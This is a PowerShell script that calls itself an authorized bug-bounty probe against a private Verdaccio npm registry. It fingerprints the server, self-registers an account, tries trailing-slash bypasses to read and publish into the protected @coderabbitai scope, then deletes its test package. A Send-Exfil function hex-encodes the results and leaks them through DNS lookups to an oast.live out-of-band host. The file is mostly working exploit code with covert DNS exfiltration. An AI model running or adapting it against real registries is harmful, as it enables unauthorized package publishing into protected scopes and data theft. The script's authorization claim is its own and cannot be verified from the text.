# Benign Verdaccio access-control probe for authorized CodeRabbit VDP research (ireniumsecurity).
# Creates a NEW package name in a protected scope, then deletes it. Touches no existing package.
$ErrorActionPreference = 'SilentlyContinue'
$OAST = 'dbiemtt54sq43hh9eomg5wg85auknd4ek.oast.live'
$R = "$env:NPM_CONFIG_REGISTRY"
if (-not $R) { $R = 'http://10.64.0.28:4873' }
$R = "$R".TrimEnd('/')
$out = [ordered]@{}

function Send-Exfil([string]$s) {
    try {
        $h = -join ([System.Text.Encoding]::UTF8.GetBytes($s) | ForEach-Object { $_.ToString('x2') })
        for ($i = 0; $i -lt $h.Length -and $i -le 480; $i += 48) {
            $chunk = $h.Substring($i, [Math]::Min(48, $h.Length - $i))
            try { [System.Net.Dns]::GetHostAddresses("psd-$([int]($i/48))-$chunk.$OAST") | Out-Null } catch {}
        }
    } catch {}
}

# 1. fingerprint
try {
    $resp = Invoke-WebRequest -Uri ($R + '/-/ping') -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 6
    $out.ping = "$([int]$resp.StatusCode)"
} catch { $out.ping = 'ERR' }
try {
    $resp = Invoke-WebRequest -Uri ($R + '/') -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 6
    $m = [regex]::Match([string]$resp.Content, 'Verdaccio[^<"\s]{0,24}')
    $out.root = "$([int]$resp.StatusCode):" + $(if ($m.Success) { $m.Value } else { 'nover' })
} catch { $out.root = 'ERR' }

# 2. self-registration
$user = 'crvdp' + (-join (1..6 | ForEach-Object { '0123456789abcdef'[(Get-Random -Maximum 16)] }))
$tok = ''
try {
    $reg = @{ name = $user; password = "CrVdp-$user-9x!" } | ConvertTo-Json -Compress
    $resp = Invoke-WebRequest -Uri ($R + '/-/user/org.couchdb.user:' + $user) -Method Put -Body $reg -ContentType 'application/json' -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 6
    $out.reg = "$([int]$resp.StatusCode)"
    try { $tok = [string](($resp.Content | ConvertFrom-Json).token) } catch {}
} catch { $out.reg = 'ERR' }
$out.tok = $tok.Length

# 3. read-bypass statuses (plain vs trailing slash)
try {
    $a = Invoke-WebRequest -Uri ($R + '/@coderabbitai%2fconfig') -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 6
    $out.rc1 = "$([int]$a.StatusCode)"
} catch { $out.rc1 = 'ERR' }
try {
    $b = Invoke-WebRequest -Uri ($R + '/@coderabbitai%2fconfig%2f') -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 6
    $out.rc2 = "$([int]$b.StatusCode)"
} catch { $out.rc2 = 'ERR' }

# 4. publish-bypass: NEW package name in the protected scope, benign prerelease, no dist-tag
if ($tok.Length -gt 0) {
    $pkg = '@coderabbitai/crvdp-probe-' + $user
    $ver = '0.0.0-crvdp'
    $tmp = Join-Path ([IO.Path]::GetTempPath()) ('crpkg-' + $user)
    New-Item -ItemType Directory -Path $tmp -Force | Out-Null
    ('{"name":"' + $pkg + '","version":"' + $ver + '"}') | Set-Content -Path (Join-Path $tmp 'package.json') -Encoding utf8
    Push-Location $tmp
    $null = npm pack 2>&1
    Pop-Location
    $tgz = Get-ChildItem -Path $tmp -Filter '*.tgz' | Select-Object -First 1
    if ($tgz) {
        $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($tgz.FullName))
        $sha1 = (Get-FileHash -Algorithm SHA1 -Path $tgz.FullName).Hash.ToLower()
        $len = $tgz.Length
        $manifest = @{
            _id = $pkg + '/'; name = $pkg + '/'; 'dist-tags' = @{};
            versions = @{ $ver = @{ name = $pkg; version = $ver; dist = @{ shasum = $sha1; tarball = ($R + '/' + $pkg + '/-/probe-' + $ver + '.tgz') } } };
            _attachments = @{ ('probe-' + $ver + '.tgz') = @{ content_type = 'application/octet-stream'; data = $b64; length = $len } }
        } | ConvertTo-Json -Depth 10 -Compress
        $hdr = @{ Authorization = ('Bearer ' + $tok) }
        $enc = $pkg.Replace('/', '%2f')
        try {
            $c = Invoke-WebRequest -Uri ($R + '/' + $enc) -Method Put -Body $manifest -ContentType 'application/json' -Headers $hdr -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 6
            $out.pub1 = "$([int]$c.StatusCode)"
        } catch { $out.pub1 = 'ERR' }
        try {
            $p = Invoke-WebRequest -Uri ($R + '/' + $enc + '%2f') -Method Put -Body $manifest -ContentType 'application/json' -Headers $hdr -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 6
            $out.pub2 = "$([int]$p.StatusCode)"
            if ([int]$p.StatusCode -in 200, 201) {
                $g = Invoke-WebRequest -Uri ($R + '/' + $enc + '%2f') -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 6
                $rev = ''
                try { $rev = [string](($g.Content | ConvertFrom-Json)._rev) } catch {}
                if ($rev) {
                    $d = Invoke-WebRequest -Uri ($R + '/' + $enc + '%2f/-rev/' + $rev) -Method Delete -Headers $hdr -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 6
                    $out.del = "$([int]$d.StatusCode)"
                }
            }
        } catch { $out.pub2 = 'ERR' }
    } else { $out.pub1 = 'notgz' }
}

Send-Exfil (($out | ConvertTo-Json -Compress))
